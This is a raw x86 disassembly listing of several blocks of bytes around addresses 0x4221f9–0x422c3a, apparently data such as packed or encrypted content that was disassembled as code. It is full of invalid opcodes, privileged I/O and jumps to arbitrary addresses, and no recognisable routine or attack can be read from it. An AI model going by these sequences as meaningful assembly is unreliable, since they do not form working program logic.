  4221f9:	sub    ch,BYTE PTR [esi]
  4221fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221fc:	ret    0x322f
  4221ff:	jg     0x422239
  422201:	xchg   BYTE PTR [ecx+0x53008114],al
  422207:	or     BYTE PTR [ebp+0x289f36d8],dl
  42220d:	jle    0x4221ea
  42220f:	out    dx,al
  422210:	bound  edi,QWORD PTR [esi-0x578ed380]
  422216:	xor    eax,DWORD PTR [eax+0x79]
  422219:	repz xor BYTE PTR [edi-0x12],cl
  42221d:	syscall 
  42221f:	xchg   ebp,eax
  422220:	ja     0x422289
  422222:	jo     0x422212
  422224:	jg     0x4221c1
  422226:	or     DWORD PTR [ecx],ebx
  422228:	push   esi
  422229:	and    ch,ah
  42222b:	and    BYTE PTR [edx+0x76],bh
  42222e:	xchg   ebx,eax
  42222f:	out    dx,al
  422230:	or     eax,0xf00d31fb
  422235:	adc    BYTE PTR [edx],bl
  422237:	mov    BYTE PTR [eax],ch
  422239:	in     al,dx
  42223a:	out    dx,eax
  42223b:	outs   dx,BYTE PTR ds:[esi]
  42223c:	add    al,0x9b
  42223e:	inc    edx
  42223f:	clc    
  422240:	repnz fild QWORD PTR [esi+0x2c]
  422244:	aam    0xcc
  422246:	mov    eax,0x4840db00
  42224b:	hlt    
  42224c:	add    DWORD PTR [edx+ebx*8-0xf01bba6],ebx
  422253:	test   al,0x31
  422255:	jmp    0xe7ea:0x9303ce21
  42225c:	add    al,0x2
  42225e:	cmc    
  42225f:	dec    ebx
  422260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422262:	fs (bad) 
  422264:	cmp    eax,0x8d0a8afe
  422269:	in     al,dx
  42226a:	and    al,0xc6
  42226c:	push   cs
  42226d:	ds nop
  42226f:	(bad)  
  422270:	push   eax
  422271:	stc    
  422272:	outs   dx,DWORD PTR ds:[esi]
  422273:	cld    
  422274:	out    dx,al
  422275:	cdq    
  422276:	inc    esi
  422277:	and    eax,0xcd967fd3
  42227c:	jmp    0x89d7:0x83ebe773
  422283:	dec    esp
  422284:	pushf  
  422285:	jb     0x422240
  422287:	les    esi,FWORD PTR [ecx-0x4e0a0b1c]
  42228d:	test   DWORD PTR [ecx],ecx
  42228f:	push   0xffffffad
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	out    dx,al
  422301:	hlt    
  422302:	mov    bh,al
  422304:	aam    0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x29000001
  42230d:	sbb    edx,esp
  42230f:	mov    ?,eax
  422311:	or     al,bl
  422313:	sti    
  422314:	dec    ebx
  422315:	push   ecx
  422316:	loopne 0x4222b2
  422318:	imul   BYTE PTR [ebx]
  42231a:	dec    edi
  42231b:	mov    bl,dl
  42231d:	arpl   WORD PTR [ebx+0x58],ax
  422320:	push   esp
  422322:	dec    eax
  422323:	int    0xa4
  422325:	fcomp  QWORD PTR [ebp-0x5b]
  422328:	sub    al,0xb5
  42232a:	and    eax,0x415a2d46
  42232f:	lahf   
  422330:	shl    DWORD PTR [ecx-0x58],1
  422333:	mov    ah,0x7d
  422335:	loop   0x4222fa
  422337:	rcl    DWORD PTR [ebx],1
  422339:	or     ebp,eax
  42233b:	or     edi,DWORD PTR [eax-0x542976c2]
  422341:	(bad)  
  422342:	jmp    0x5f539e5d
  422347:	std    
  422348:	icebp  
  422349:	stos   BYTE PTR es:[edi],al
  42234a:	xchg   ebp,eax
  42234b:	sbb    al,0x5a
  42234d:	lods   al,BYTE PTR ds:[esi]
  42234e:	push   ss
  42234f:	inc    ecx
  422350:	xchg   edi,eax
  422351:	fsubr  DWORD PTR [esi+0x15]
  422354:	adc    DWORD PTR [ebp+0x54],edi
  422357:	out    dx,al
  422358:	sbb    al,ch
  42235a:	mov    BYTE PTR [edi+0x285b3bf1],bl
  422360:	fxch   st(6)
  422362:	inc    esp
  422363:	out    0x93,eax
  422365:	and    eax,0x1bd7820d
  42236a:	xchg   edx,eax
  42236b:	bound  esi,QWORD PTR [edx+0x20a8fc47]
  422371:	mov    bl,0x5b
  422373:	cmp    BYTE PTR [ebp+0x2e915af7],0x53
  42237a:	iret   
  42237b:	out    dx,al
  42237c:	(bad)  
  42237d:	inc    ebx
  42237e:	sbb    ch,BYTE PTR [ecx+0x1930bf44]
  422384:	sysret 
  422386:	imul   eax,DWORD PTR [edi],0x318d6153
  42238c:	pop    ds
  42238d:	out    dx,eax
  42238e:	stos   DWORD PTR es:[edi],eax
  42238f:	cmc    
  422390:	xchg   ebx,eax
  422391:	cdq    
  422392:	fwait
  422393:	mov    dl,BYTE PTR [edi]
  422395:	or     eax,0xc6bb0435
  42239a:	mov    cs,WORD PTR [eax-0x3bfe1d6f]
  4223a0:	inc    edx
  4223a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223a2:	std    
  4223a3:	arpl   WORD PTR [esi+0x7],di
  4223a6:	aad    0x74
  4223a8:	stos   BYTE PTR es:[edi],al
  4223a9:	test   eax,0xc30be5d7
  4223ae:	xchg   ebp,eax
  4223af:	dec    ebp
  4223b0:	mov    esi,0x9a4fe212
  4223b5:	daa    
  4223b6:	inc    ecx
  4223b7:	sbb    ecx,DWORD PTR ds:[esi-0x5e7e9a13]
  4223be:	jp     0x422436
  4223c0:	jae    0x422357
  4223c2:	and    BYTE PTR [ebp+0x7c],cl
  4223c5:	lahf   
  4223c6:	mov    ebp,0x5a86c4bf
  4223cb:	les    esi,FWORD PTR [edx]
  4223cd:	test   dh,bl
  4223cf:	mov    ds:0x1bb7bde0,al
  4223d4:	xchg   esp,eax
  4223d5:	push   ebp
  4223d6:	mov    eax,0x4c08d96
  4223db:	xchg   esp,eax
  4223dc:	(bad)  
  4223dd:	in     eax,dx
  4223de:	std    
  4223df:	inc    ecx
  4223e0:	les    ebx,FWORD PTR [edx+0x22]
  4223e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223e4:	xor    bh,BYTE PTR [edx]
  4223e6:	add    DWORD PTR [ecx],eax
  4223e8:	sbb    cl,BYTE PTR [eax-0x411a511f]
  4223ee:	or     dh,ch
  4223f0:	push   eax
  4223f1:	shl    dl,cl
  4223f3:	xor    ah,BYTE PTR [eax-0x5]
  4223f6:	(bad)  
  4223f7:	push   0x17
  4223f9:	outs   dx,BYTE PTR ds:[esi]
  4223fa:	pop    edx
  4223fb:	jmp    0x6968:0xd303017c
  422402:	jo     0x4223d6
  422404:	(bad)  
  422405:	dec    eax
  422406:	lods   al,BYTE PTR ds:[esi]
  422407:	push   esp
  422408:	cmc    
  422409:	push   eax
  42240a:	mov    edi,0x5843555b
  42240f:	mov    ch,0x23
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	icebp  
  422481:	shl    BYTE PTR [ebx],cl
  422483:	push   eax
  422484:	fldcw  WORD PTR [ebp+0x1]
  422487:	add    BYTE PTR ds:0xc5000001,al
  42248d:	outs   dx,DWORD PTR ds:[esi]
  42248e:	test   BYTE PTR [edx+0x5e],dl
  422491:	int3   
  422492:	pusha  
  422493:	out    dx,eax
  422494:	popa   
  422495:	inc    ebp
  422496:	jge    0x422506
  422498:	stos   BYTE PTR es:[edi],al
  422499:	fst    st(1)
  42249b:	loope  0x42243d
  42249d:	fmul   st,st(5)
  42249f:	mov    bl,0x66
  4224a1:	(bad)  
  4224a3:	loope  0x4224c8
  4224a5:	aas    
  4224a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a7:	ret    
  4224a8:	cld    
  4224a9:	sbb    eax,0x6dcbd8ee
  4224ae:	je     0x422492
  4224b0:	js     0x4224cd
  4224b2:	jbe    0x4224da
  4224b4:	jp     0x4224d2
  4224b6:	rcl    DWORD PTR [esi+0x57],1
  4224b9:	sbb    cl,BYTE PTR [esi+ecx*1]
  4224bc:	mov    esp,0xe733cb83
  4224c1:	pop    ebp
  4224c3:	mov    ebp,0xb6df09a5
  4224c8:	out    dx,al
  4224c9:	push   cs
  4224ca:	cli    
  4224cb:	dec    esp
  4224cc:	adc    eax,0x78079a94
  4224d1:	mov    esi,0xbab79b4
  4224d6:	add    edi,ebx
  4224d8:	leave  
  4224d9:	outs   dx,DWORD PTR ds:[esi]
  4224da:	and    edx,DWORD PTR [eax]
  4224dc:	mov    esp,0xe25a2447
  4224e1:	pop    ds
  4224e2:	aaa    
  4224e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e4:	push   0xffffffc4
  4224e6:	ss xchg ecx,eax
  4224e8:	ficomp DWORD PTR [edi+ebp*8+0x5]
  4224ec:	adc    cl,al
  4224ee:	jne    0x4224e0
  4224f0:	into   
  4224f1:	xchg   ecx,eax
  4224f2:	in     eax,dx
  4224f3:	mov    ebp,0xbd12c1f9
  4224f8:	pop    eax
  4224f9:	add    esp,edx
  4224fb:	jmp    0x4224b3
  4224fd:	xchg   esi,eax
  4224fe:	jnp    0x422578
  422500:	mov    DWORD PTR [edx-0x7fbb530c],edx
  422506:	dec    esp
  422507:	mov    ecx,0xb999b2ad
  42250c:	popa   
  42250d:	sub    eax,esi
  42250f:	repnz pop edi
  422511:	cld    
  422512:	stos   BYTE PTR es:[edi],al
  422513:	cld    
  422514:	nop
  422515:	mov    WORD PTR [edi-0x5f],gs
  422518:	test   BYTE PTR [esi+0x52],al
  42251b:	pop    esp
  42251c:	jnp    0x422541
  42251e:	jmp    0x422554
  422520:	test   al,0x17
  422522:	xor    al,0x76
  422524:	ins    DWORD PTR es:[edi],dx
  422525:	add    al,0xd9
  422527:	frstor [ebx+ecx*4]
  42252a:	xchg   ebp,eax
  42252b:	dec    eax
  42252c:	stc    
  42252d:	test   eax,0x481da577
  422532:	pop    es
  422533:	xor    esi,DWORD PTR [edi-0x50]
  422536:	push   cs
  422537:	mov    WORD PTR [edx+ecx*8],es
  42253a:	push   0xffffff95
  42253c:	call   0xcd531435
  422541:	repz fwait
  422543:	pop    edi
  422544:	popa   
  422545:	call   0x3b7903a9
  42254a:	push   cs
  42254b:	sbb    DWORD PTR [esi-0x28aef5ca],ebp
  422551:	cmc    
  422552:	daa    
  422553:	mov    cs,WORD PTR [eax-0x5dae587e]
  422559:	xlat   BYTE PTR ds:[ebx]
  42255a:	cmp    BYTE PTR [ebx-0x5503bd34],ah
  422560:	imul   ecx,eax,0x47
  422563:	ins    DWORD PTR es:[edi],dx
  422564:	dec    eax
  422565:	lea    eax,[ecx+0x0]
  422568:	imul   eax,edi,0xffffffa8
  42256b:	es dec ebp
  42256d:	shl    BYTE PTR [edx-0x2f90e508],1
  422573:	mov    al,dh
  422575:	mov    edx,0x44b6c9dd
  42257a:	rol    DWORD PTR [edi],0x9c
  42257d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42257e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42257f:	lods   eax,DWORD PTR ds:[esi]
  422580:	mov    al,cl
  422582:	xchg   edx,eax
  422583:	pop    edx
  422584:	outs   dx,BYTE PTR ds:[esi]
  422585:	jmp    0xa8b2416e
  42258a:	hlt    
  42258b:	popa   
  42258c:	sub    edx,ebp
  42258e:	pop    ebp
  42258f:	xor    edx,DWORD PTR [edx+0x0]
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x469f5d08]
  422602:	add    edx,eax
  422604:	fisubr WORD PTR [esi+0x1]
  422607:	add    BYTE PTR ds:0x10000001,al
  42260d:	and    DWORD PTR [ecx-0x61cb1280],eax
  422613:	(bad)  
  422614:	loope  0x422622
  422616:	mov    ebx,0xca50b9a5
  42261b:	sbb    al,0x5d
  42261d:	xor    esi,0xffffff80
  422620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422621:	mov    dh,0x90
  422623:	fwait
  422624:	sub    ah,BYTE PTR [ecx-0x6f]
  422627:	pop    ecx
  422628:	jg     0x4225ee
  42262a:	pop    edx
  42262b:	call   0xfc2347b3
  422630:	mov    ss,WORD PTR [ebx+0x7aee1cc5]
  422636:	lods   al,BYTE PTR ds:[esi]
  422637:	pop    esp
  422638:	push   eax
  422639:	fwait
  42263a:	cld    
  42263b:	es jp  0x4225c6
  42263e:	test   BYTE PTR [edx-0x3c739816],cl
  422644:	pop    eax
  422645:	and    al,0xd1
  422647:	sub    edi,DWORD PTR [edi-0x7ad4a734]
  42264d:	jmp    DWORD PTR [edx-0x33]
  422650:	add    eax,0x815c9142
  422655:	cmp    edx,ecx
  422657:	ds (bad) 
  422659:	adc    bl,ah
  42265b:	out    dx,al
  42265c:	xchg   ebp,eax
  42265d:	fisubr DWORD PTR [eax+0x45]
  422660:	xor    BYTE PTR [edi],bh
  422662:	sbb    eax,DWORD PTR [ecx-0x36]
  422665:	outs   dx,DWORD PTR ds:[esi]
  422666:	pop    esi
  422667:	call   0x3e009b60
  42266c:	sub    ebx,DWORD PTR [eax+eax*2+0x2]
  422670:	sbb    cl,BYTE PTR [eax]
  422672:	jmp    0x4226c0
  422674:	xchg   edi,eax
  422675:	sti    
  422676:	sub    DWORD PTR [eax+esi*8-0x6ead9273],edx
  42267d:	or     DWORD PTR [ebx-0x28351113],esi
  422683:	pushf  
  422684:	shr    cl,cl
  422686:	xlat   BYTE PTR es:[ebx]
  422688:	js     0x4226ba
  42268a:	inc    BYTE PTR [ebx]
  42268c:	inc    edx
  42268d:	ins    DWORD PTR es:[edi],dx
  42268e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268f:	mov    es,WORD PTR [ebx+0x4227a4ab]
  422695:	sub    BYTE PTR [ebx],0x7a
  422698:	sub    DWORD PTR [ecx+0x69f3603],ebp
  42269e:	cmp    ebx,DWORD PTR [edi-0x6f]
  4226a1:	enter  0x4f29,0xad
  4226a5:	sti    
  4226a6:	push   esi
  4226a7:	lock mov ebx,ss
  4226aa:	fdiv   DWORD PTR [esi-0x17]
  4226ad:	mov    bh,0x52
  4226af:	(bad)  
  4226b1:	fidivr WORD PTR [ebx+0x2]
  4226b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226b5:	scas   al,BYTE PTR es:[edi]
  4226b6:	sbb    DWORD PTR [ebp+0x99f52bf],edx
  4226bc:	test   BYTE PTR [eax],bl
  4226be:	sbb    BYTE PTR [edx],ah
  4226c0:	dec    edi
  4226c1:	adc    DWORD PTR [eax-0x6377288f],eax
  4226c7:	mov    bh,0xe9
  4226c9:	(bad)  
  4226cb:	dec    edi
  4226cc:	mov    ebx,0xc10b5e13
  4226d1:	retf   
  4226d2:	jne    0x422673
  4226d4:	scas   al,BYTE PTR es:[edi]
  4226d5:	enter  0x9afa,0xcd
  4226d9:	push   ebp
  4226da:	imul   edi,DWORD PTR [edx*1+0x1fb0eb16],0xb4286388
  4226e5:	(bad)  
  4226e6:	xchg   ch,dl
  4226e8:	jnp    0x422700
  4226ea:	sub    DWORD PTR [ebx-0x45d54477],edi
  4226f0:	popf   
  4226f1:	ret    
  4226f2:	and    DWORD PTR [ebx+0x5],eax
  4226f5:	adc    dh,dh
  4226f7:	mov    edx,0x2926b9e6
  4226fc:	mov    esp,0x8fc0633b
  422701:	jmp    0xe5fa:0x7b3d1a23
  422708:	mov    dh,0x61
  42270a:	clc    
  42270b:	ret    0x544c
  42270e:	inc    edx
  42270f:	pop    ss
  422710:	mov    bh,0x0
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xe97f01c8
  422781:	lahf   
  422782:	gs and ebx,esp
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0xf4000001
  42278d:	jo     0x42275d
  42278f:	arpl   dx,cx
  422791:	pop    edi
  422792:	loop   0x422720
  422794:	sbb    eax,0xd6ba372
  422799:	fisubr WORD PTR [edi]
  42279b:	mov    ch,0x7b
  42279d:	inc    edi
  42279e:	lods   al,BYTE PTR ds:[esi]
  42279f:	and    BYTE PTR [edx],cl
  4227a1:	scas   eax,DWORD PTR es:[edi]
  4227a2:	and    BYTE PTR [edx],bh
  4227a4:	sub    eax,0x126508c3
  4227a9:	in     eax,0x59
  4227ab:	mov    bh,0x97
  4227ad:	icebp  
  4227ae:	xor    ebx,esp
  4227b0:	stc    
  4227b1:	lods   al,BYTE PTR ds:[esi]
  4227b2:	inc    edi
  4227b3:	cs cdq 
  4227b5:	jmp    0x38578f24
  4227ba:	mov    ds:0x24861a30,al
  4227bf:	in     eax,dx
  4227c0:	mov    WORD PTR [eax-0x59],?
  4227c3:	inc    ebx
  4227c4:	dec    edi
  4227c5:	mov    al,ds:0x6cf95a2e
  4227ca:	enter  0x2905,0x46
  4227ce:	push   ebx
  4227cf:	sahf   
  4227d0:	bound  eax,QWORD PTR es:[eax]
  4227d3:	or     ebx,esi
  4227d5:	or     esp,DWORD PTR [eax-0x69]
  4227d8:	mov    BYTE PTR [esi],dh
  4227da:	mov    ds:0xe678fa9d,al
  4227df:	scas   al,BYTE PTR es:[edi]
  4227e0:	adc    al,0xfb
  4227e2:	jmp    0xb499:0xc7d10f92
  4227e9:	je     0x422846
  4227eb:	icebp  
  4227ec:	sahf   
  4227ed:	sub    eax,0x3fd2977b
  4227f2:	cmc    
  4227f3:	pop    edx
  4227f4:	(bad)  
  4227f5:	iret   
  4227f6:	retf   0xf024
  4227f9:	add    DWORD PTR [eax-0x42],esi
  4227fc:	int    0x56
  4227fe:	sbb    DWORD PTR [eiz*8+0x664d3da1],esi
  422805:	xor    al,0x37
  422807:	in     eax,0x1c
  422809:	inc    edx
  42280a:	fnsave [esp+ebp*2+0x1ee8cc8e]
  422811:	mov    ds:0x3d36ea10,al
  422816:	xor    al,0xcb
  422818:	xor    BYTE PTR [ebx],bl
  42281a:	xor    bl,BYTE PTR [esi]
  42281c:	cmp    DWORD PTR [ecx+edx*1+0x16eb30a0],0xe
  422824:	ret    
  422825:	push   0xffffff9a
  422827:	rcr    BYTE PTR [ecx],cl
  422829:	inc    esp
  42282a:	pop    ds
  42282b:	adc    ebx,DWORD PTR ds:0xac5b4dfb
  422831:	cmp    al,0x64
  422833:	popf   
  422834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422835:	cmc    
  422836:	add    eax,0x3048536f
  42283b:	scas   eax,DWORD PTR es:[edi]
  42283c:	mov    edi,0xaf2ec0c9
  422841:	fsubr  DWORD PTR [esp+eax*2]
  422844:	mov    BYTE PTR [eax-0x418a6b1f],ch
  42284a:	inc    esp
  42284b:	xchg   esp,eax
  42284c:	stc    
  42284d:	add    BYTE PTR [ebx+0x7b],bl
  422850:	stc    
  422851:	sub    al,0xc7
  422853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422854:	faddp  st(6),st
  422856:	add    BYTE PTR [ebx+0x44f6e8f],ah
  42285c:	fisttp WORD PTR ds:[ebx-0x71]
  422860:	add    esi,eax
  422862:	sub    esp,DWORD PTR [eax]
  422864:	ret    0xfc55
  422867:	outs   dx,BYTE PTR ds:[esi]
  422868:	dec    edx
  422869:	inc    esp
  42286a:	out    dx,eax
  42286b:	sar    BYTE PTR [ecx+0xf],1
  42286e:	and    al,0x9a
  422870:	xchg   esp,eax
  422871:	ror    ebx,cl
  422873:	mov    al,cl
  422875:	rcr    BYTE PTR [eax-0x6e8c796e],1
  42287b:	push   edx
  42287c:	pusha  
  42287d:	repz test BYTE PTR [edi+ebp*4-0x4b],bh
  422882:	xor    edx,DWORD PTR [edx+0x2409f6ec]
  422888:	in     eax,0xe1
  42288a:	fs mov ecx,0xd2193785
  422890:	stos   BYTE PTR es:[edi],al
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422960
  422901:	cmp    ah,BYTE PTR [eax+0x42]
  422904:	call   0x5422a79
  422909:	add    DWORD PTR [eax],eax
  42290b:	add    BYTE PTR [ebx-0x38a81ebc],ch
  422911:	repz neg DWORD PTR [edi-0x3d1737d4]
  422918:	dec    DWORD PTR [eax+0x4b]
  42291b:	mov    bl,0x3c
  42291d:	shl    ecx,cl
  42291f:	stos   DWORD PTR es:[edi],eax
  422920:	jl     0x4228d2
  422922:	dec    esp
  422923:	inc    edi
  422924:	push   eax
  422925:	push   ebp
  422926:	jp     0x4228ad
  422928:	mov    edx,0x80dcfdf9
  42292d:	mov    eax,ds:0xb675ca7c
  422932:	sbb    esp,ebp
  422934:	mov    edx,0x3b61ca78
  422939:	gs scas eax,DWORD PTR es:[edi]
  42293b:	mov    edi,0x6ae71ccc
  422940:	mov    cl,0xa
  422942:	jecxz  0x422931
  422944:	xchg   esp,eax
  422945:	and    bh,BYTE PTR [ebx+0x53]
  422948:	das    
  422949:	push   eax
  42294a:	push   esp
  42294b:	repz enter 0x1918,0x99
  422950:	jmp    0xe1afd784
  422955:	and    ah,BYTE PTR [eax+0x24]
  422958:	and    eax,0x4ef4590c
  42295d:	gs push 0x7008d8c5
  422963:	mov    eax,DWORD PTR [ecx]
  422965:	adc    al,0x95
  422967:	push   0x87d32b09
  42296c:	mov    bh,0x6b
  42296e:	lock push ebx
  422970:	bound  edi,QWORD PTR [ecx+0x3e72ef6c]
  422976:	fwait
  422977:	cmp    DWORD PTR ds:0xc6558abe,ebx
  42297d:	jmp    0xda1c:0xe193d64e
  422984:	dec    edi
  422985:	sub    bh,BYTE PTR [edx]
  422987:	out    0x7c,al
  422989:	pop    esp
  42298a:	add    DWORD PTR [edx-0x4e],ebx
  42298d:	pop    eax
  42298e:	xor    eax,0xc9cbd808
  422993:	or     ebx,ebp
  422995:	ins    BYTE PTR es:[edi],dx
  422996:	push   ecx
  422997:	cmc    
  422998:	add    ah,bh
  42299a:	or     eax,0x876ebd43
  42299f:	xchg   edi,eax
  4229a0:	rcr    DWORD PTR [eax],1
  4229a2:	ret    
  4229a3:	loopne 0x4229d8
  4229a5:	(bad)
  4229a9:	xchg   DWORD PTR ds:0x19567d4f,edi
  4229af:	(bad)  
  4229b0:	fild   QWORD PTR [ebp+0x1b9f7779]
  4229b6:	push   cs
  4229b7:	out    0x79,eax
  4229b9:	jmp    0xef58:0xc54c3d90
  4229c0:	pop    ebx
  4229c1:	pusha  
  4229c2:	jns    0x4229fa
  4229c4:	jg     0x42298c
  4229c6:	imul   esp,DWORD PTR [edi-0x5],0xe01d8854
  4229cd:	fistp  WORD PTR [eax-0x7621ab99]
  4229d3:	or     bl,BYTE PTR [ebx-0x44]
  4229d6:	push   0x0
  4229d8:	inc    esp
  4229d9:	call   0x4a21:0xfc6fcee3
  4229e0:	fs inc ebp
  4229e2:	pop    ss
  4229e3:	stc    
  4229e4:	mov    ch,0xa8
  4229e6:	sahf   
  4229e7:	(bad)  
  4229e8:	gs stos DWORD PTR es:[edi],eax
  4229ea:	(bad)  
  4229eb:	mov    eax,ds:0x99815c02
  4229f0:	pop    esi
  4229f1:	in     eax,dx
  4229f2:	aaa    
  4229f3:	mov    WORD PTR [ebp-0x25],ds
  4229f6:	jno    0x4229f0
  4229f8:	add    al,0x49
  4229fa:	dec    edx
  4229fb:	icebp  
  4229fc:	jne    0x422a35
  4229fe:	shl    BYTE PTR [edi-0xf8c1aa7],1
  422a04:	hlt    
  422a05:	xchg   ecx,eax
  422a06:	xor    DWORD PTR [ebp-0x15],0x11d5f7c1
  422a0d:	out    0x50,eax
  422a0f:	mov    DWORD PTR [eax+eax*1],ecx
	...
  422a72:	add    BYTE PTR [eax],al
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	pop    ebx
  422a81:	cmp    eax,DWORD PTR [edi+0x39]
  422a84:	in     eax,dx
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0xb6000001,al
  422a8d:	xor    eax,DWORD PTR [ebx-0x4c5e9ff4]
  422a93:	dec    eax
  422a94:	ss add cl,ah
  422a97:	add    ch,BYTE PTR [edx+0x30]
  422a9a:	dec    edi
  422a9b:	pop    eax
  422a9c:	(bad)  
  422a9d:	call   0x6574a17e
  422aa2:	mov    eax,0x631f57ed
  422aa7:	and    BYTE PTR [edi-0x14],al
  422aaa:	data16 xor cl,ch
  422aad:	push   ebx
  422aae:	sub    bh,BYTE PTR [ebx-0x39]
  422ab1:	in     al,dx
  422ab2:	fxch   st(1)
  422ab4:	push   ss
  422ab5:	mov    al,0x5a
  422ab7:	into   
  422ab8:	mul    DWORD PTR [ebp-0x3c]
  422abb:	or     BYTE PTR [ecx+ecx*1-0x54],0x7e
  422ac0:	sahf   
  422ac1:	sahf   
  422ac2:	jae    0x422b1d
  422ac4:	pop    esi
  422ac5:	push   ebx
  422ac6:	push   edi
  422ac7:	pop    eax
  422ac8:	adc    al,0xab
  422aca:	adc    al,0xf1
  422acc:	leave  
  422acd:	mov    edx,0x2cd3edb4
  422ad2:	ds iret 
  422ad4:	xchg   esi,eax
  422ad5:	sbb    BYTE PTR [edi+0x580bf8a7],al
  422adb:	mov    eax,0x8125eff1
  422ae0:	(bad)  
  422ae1:	jnp    0x422b3d
  422ae3:	outs   dx,BYTE PTR ds:[esi]
  422ae4:	and    eax,0x91ba19f0
  422ae9:	ds popf 
  422aeb:	addr16 mov bl,0xc
  422aee:	int    0x19
  422af0:	and    BYTE PTR [edi-0x10],bl
  422af3:	loop   0x422b49
  422af5:	cmc    
  422af6:	test   eax,edx
  422af8:	xor    DWORD PTR [ecx-0x79da4691],eax
  422afe:	out    0x47,eax
  422b00:	adc    BYTE PTR [ebp+0x7afee450],bh
  422b06:	cmp    eax,0xaf52eca9
  422b0b:	fistp  QWORD PTR [esi-0x7c]
  422b0e:	aaa    
  422b0f:	cmp    eax,esp
  422b11:	xlat   BYTE PTR ds:[ebx]
  422b12:	fstp   st(3)
  422b14:	bound  esp,QWORD PTR [ebp+0x5c]
  422b17:	popf   
  422b18:	(bad)  
  422b19:	lahf   
  422b1a:	icebp  
  422b1b:	(bad)  
  422b1c:	jge    0x422b56
  422b1e:	and    dl,al
  422b20:	(bad)  
  422b21:	pop    eax
  422b22:	cmp    edi,DWORD PTR [ebx-0x5e25975f]
  422b28:	cmp    al,0x70
  422b2a:	xor    DWORD PTR [ebx-0x2a1ae4da],0xcd1e7eb5
  422b34:	popf   
  422b35:	aad    0x50
  422b37:	fsub   DWORD PTR [ebx-0x512ba4a9]
  422b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b3e:	scas   eax,DWORD PTR es:[edi]
  422b3f:	jne    0x422b7e
  422b41:	lahf   
  422b42:	sub    bl,BYTE PTR [ebp+0x70841e83]
  422b48:	leave  
  422b49:	adc    DWORD PTR [ebx-0x68],0xffffffa6
  422b4d:	or     esp,DWORD PTR [esi-0x15]
  422b50:	cs jno 0x422b1b
  422b53:	mov    dl,0x18
  422b55:	int    0xc1
  422b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b58:	and    BYTE PTR [ecx-0x3500b7a],cl
  422b5e:	sub    DWORD PTR [esi],ecx
  422b60:	daa    
  422b61:	adc    BYTE PTR [ebx-0x61],cl
  422b64:	cmp    ch,BYTE PTR [edx+eax*8-0x3cd8634a]
  422b6b:	sbb    eax,0xa14d35b4
  422b70:	dec    eax
  422b71:	adc    DWORD PTR [ebp+0x20ba2dcc],ebp
  422b77:	fdiv   DWORD PTR [ecx-0x68db7d2a]
  422b7d:	sti    
  422b7e:	push   0x1bad9303
  422b83:	data16 mov bh,0xa9
  422b86:	inc    ebp
  422b87:	xchg   esp,eax
  422b88:	mov    ds:0x4df372d,al
  422b8d:	dec    ecx
  422b8e:	push   eax
  422b8f:	fs add al,0x0
	...
  422bf2:	add    BYTE PTR [eax],al
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x4daab264]
  422c02:	mov    dl,dh
  422c04:	bnd jb 0x422c08
  422c07:	add    BYTE PTR ds:0xfc000001,al
  422c0d:	scas   al,BYTE PTR es:[edi]
  422c0e:	jg     0x422c88
  422c10:	sbb    al,BYTE PTR [esi-0x7a]
  422c13:	mov    ch,0x70
  422c15:	repz pop ss
  422c17:	or     eax,0x1350f9e7
  422c1c:	ror    BYTE PTR [esp+eiz*2],cl
  422c1f:	aaa    
  422c20:	icebp  
  422c21:	int3   
  422c22:	inc    ebp
  422c23:	idiv   ebp
  422c25:	nop
  422c26:	xchg   ebx,eax
  422c27:	adc    DWORD PTR [ecx],ecx
  422c29:	dec    ebp
  422c2a:	xchg   BYTE PTR [ebx-0x7c],ah
  422c2d:	dec    ecx
  422c2e:	mov    ds:0xa33b138a,al
  422c33:	jecxz  0x422c88
  422c35:	push   0x231a391a
  422c3a:	mov    ebx,0xc9a93768
